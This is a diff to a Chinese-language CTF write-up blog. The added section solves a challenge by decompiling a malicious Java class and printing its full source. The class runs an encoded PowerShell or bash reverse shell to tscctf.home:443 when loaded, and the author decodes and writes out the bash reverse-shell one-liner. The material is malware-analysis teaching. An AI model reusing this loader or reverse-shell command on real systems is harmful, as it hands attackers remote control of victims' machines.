@@ -8,7 +8,6 @@ tags:
 categories:
   - 資安
   - CTF
-  - Writeup
 abbrlink: 20658
 date: 2025-01-17 00:00:00
 lang:
@@ -729,3 +728,64 @@ payload: `(𝘥:=()._＿𝘥𝘰𝘤＿_,𝘥:=()._＿𝘥𝘪𝘳＿_().__𝘤�
 P.S. 不知道為什麼這坨如果一次複製直接貼上有些字會變成 (U+FFFD) ，但如果分批複製就不會 w
 
 flag: `TSC{PEP-3131_is_a_friendly_PEP_for_pyjai1er_nhsdcuhq6}`
+
+## 補題區
+
+### Misc - A Minecraft SOC Mission
+
+這題其實賽中就有做出來了，但 flag 格式搞錯了 啊啊啊啊啊，與 388 分失之交臂
+
+把下載的 `Evil.class` 拿去反編譯 (可以用[這個](https://decompiler.com/))，就會得到
+
+```java
+import java.util.Base64;
+
+public class Evil extends ClassLoader {
+   private static final String[] $ = new String[]{"QTlXNHY2eXVpPQ==", "WVcxdmJtY3NJR0Z1WkNCemJ5QnBjeUJwZENCbGVHVmpkWFJwYm1jPQ==", "ZEhOalpYUm1MbWh2YldVPQ=="};
+   private static String ᅟ = "k9";
+   private static int ㅤ = 1017;
+
+   private void ᅠ(byte[] var1) {
+      try {
+         String[] var2 = (new String(Base64.getDecoder().decode($[1]))).split(",");
+         new String(Base64.getDecoder().decode($[2]));
+         String var4 = (String)Class.forName("java.lang.System").getMethod("getProperty", String.class).invoke((Object)null, var2[0]);
+         boolean var5 = var4.toLowerCase().contains(var2[1]);
+         String[] var10000;
+         if (var5) {
+            var10000 = new String[]{"cmd.exe", "/c", null};
+            String var10003 = new String(new byte[]{112, 111, 119, 101, 114, 115, 104, 101, 108, 108, 32, 45, 101, 32});
+            var10000[2] = var10003 + "JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAdABzAGMAYwB0AGYALgBoAG8AbQBlACIALAA0ADQAMwApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA";
+         } else {
+            var10000 = new String[]{"/bin/bash", "-c", this.ㅤㅤ(new String[]{"echo", "YmFzaCAtaSA+JiAvZGV2L3RjcC90c2NjdGYuaG9tZS80NDMgMD4mMQ==", "base64", "-d", "bash"})};
+         }
+
+         String[] var6 = var10000;
+         Class.forName("java.lang.Runtime").getMethod("exec", String[].class).invoke(Class.forName("java.lang.Runtime").getMethod("getRuntime").invoke((Object)null), var6);
+      } catch (Exception var7) {
+      }
+
+   }
+
+   private String ㅤㅤ(String[] var1) {
+      StringBuilder var2 = new StringBuilder();
+
+      for(int var3 = 0; var3 < var1.length; ++var3) {
+         var2.append(var1[var3]);
+         if (var3 < var1.length - 1) {
+            var2.append(" | ");
+         }
+      }
+
+      return var2.toString();
+   }
+
+   static {
+      (new Evil()).ᅠ(new byte[0]);
+   }
+}
+```
+
+把一些看起來像 base64 過的東西解密後就知道他是一個執行 reverse shell 的程式 `bash -i >& /dev/tcp/tscctf.home/443 0>&1` ，然後要交的東西就是 `tscctf.home` 了，原本還在想要怎麼找到 ip 還用 `tscctf{}` 包起來，沒想到這麼簡單嗚嗚
+
+flag: `tscctf.home`
